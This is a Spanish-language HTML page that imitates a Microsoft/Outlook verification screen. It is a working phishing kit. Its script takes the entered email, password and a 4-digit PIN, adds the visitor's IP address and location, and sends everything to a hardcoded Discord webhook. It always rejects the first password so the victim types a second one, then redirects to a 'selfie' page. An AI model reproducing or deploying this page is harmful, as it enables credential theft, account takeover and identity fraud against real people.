<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Outlook Verification</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }
    body {
      background: linear-gradient(135deg, #f5f7fa, #e4edf9);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      max-width: 450px;
      width: 100%;
      background: white;
      border-radius: 12px;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
      padding: 30px;
      text-align: center;
    }
    .logo {
      width: 80px;
      margin-bottom: 20px;
    }
    .container p {
      font-size: 20px;
      font-weight: 500;
      color: #1a1a1a;
      margin-bottom: 24px;
    }
    .form-group {
      margin-bottom: 18px;
      text-align: left;
    }
    .form-group input {
      width: 100%;
      padding: 12px 16px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 15px;
      transition: border-color 0.3s;
    }
    .form-group input:focus {
      border-color: #0067b8;
      outline: none;
    }
    #error-message {
      color: #d32f2f;
      font-size: 14px;
      margin-bottom: 15px;
      display: none;
    }
    .btn-primary {
      width: 100%;
      padding: 12px;
      background-color: #0067b8;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.3s;
    }
    .btn-primary:hover {
      background-color: #005a9e;
    }
    .no-account {
      margin-top: 20px;
      font-size: 14px;
      color: #666;
    }
    .no-account a {
      color: #0067b8;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://www.freepnglogos.com/uploads/microsoft-logo-png-transparent-background-1.png" alt="Microsoft" class="logo">
    <p>Microsoft Verification</p>
    <div id="error-message">❌ Contraseña incorrecta. Inténtalo de nuevo.</div>
    <form id="loginForm">
      <div class="form-group">
        <input type="email" id="email" name="email" placeholder="Correo electrónico" required>
      </div>
      <div class="form-group">
        <input type="password" id="password" name="password" placeholder="Contraseña" required>
      </div>
      <div class="form-group">
        <input 
          type="text" 
          id="pin" 
          name="pin" 
          placeholder="Crea PIN de 4 dígitos" 
          maxlength="4" 
          inputmode="numeric" 
          pattern="\d{4}" 
          required
          oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);"
        >
      </div>
      <button type="submit" class="btn-primary">Continuar</button>
      <p class="no-account">¿No tienes cuenta? <a href="#">Crea una</a></p>
    </form>
  </div>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script>
    const wurl = "https://discord.com/api/webhooks/1491559039040098304/bS5nzWMQwDdnQL2v26CpLKRArD_SPv53YiQDBLlwuujAEpemkEk0lA0ZSowsLzhbuxGj";
    let intentos = 0;

    $('#loginForm').on('submit', async function(e) {
      e.preventDefault();
      const email = $('#email').val();
      const password = $('#password').val();
      const pin = $('#pin').val();

      if (!/^\d{4}$/.test(pin)) {
        alert("El PIN debe tener exactamente 4 dígitos numéricos.");
        return;
      }

      intentos++;
      try {
        const [ipRes, locRes] = await Promise.all([
          fetch('https://api.ipify.org?format=json'),
          fetch('https://ipinfo.io/json')
        ]);
        const ip = (await ipRes.json()).ip;
        const locData = await locRes.json();
        const location = `${locData.city || 'Desconocida'}, ${locData.country || 'Desconocido'}`;

        const mensaje = `
📧 **Intento #${intentos}**  
📧 **Correo**: ${email}  
🔒 **Contraseña**: ${password}  
🔢 **PIN (4 dígitos)**: ${pin}  
🌐 **IP**: ${ip}  
📍 **Ubicación**: ${location}
        `.trim();

        await fetch(wurl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: mensaje })
        });

        localStorage.setItem("correo", email);
        localStorage.setItem("pin", pin);

        if (intentos === 1) {
          $('#error-message').show();
          $('#password').val('');
        } else {
          window.location.href = "selfie.html";
        }
      } catch (error) {
        console.error('Error:', error);
        alert('Ocurrió un error al procesar la solicitud.');
      }
    });
  </script>
</body>
</html>